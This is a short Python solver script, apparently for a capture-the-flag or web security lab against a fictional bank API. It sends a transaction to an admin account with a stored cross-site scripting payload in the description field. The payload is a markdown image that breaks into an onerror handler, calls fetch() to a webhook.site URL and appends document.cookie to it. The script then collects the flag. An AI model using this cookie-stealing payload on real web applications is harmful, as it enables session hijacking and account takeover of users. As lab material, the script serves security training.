import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        API_BASE_URL = "https://api.netquocca.quoccacorp.com"

        response = self.session.get(f"{API_BASE_URL}/accounts")
        my_account = response.json()["accounts"][0]
        my_bsb, my_account_number = my_account["bsb"], my_account["account_number"]

        ADMIN_BSB = "069-420"
        ADMIN_ACCOUNT_NUMBER = "00000000"

        # No spaces allowed
        PAYLOAD = f'''![x]("onerror="fetch(`{self.webhooksite.url}?q=${{document.cookie}}`))'''

        self.session.post(f"{API_BASE_URL}/transactions", json={
            "from_account": { "bsb": my_bsb, "account_number": my_account_number },
            "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
            "description": PAYLOAD,
            "amount": 0.01
        })

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
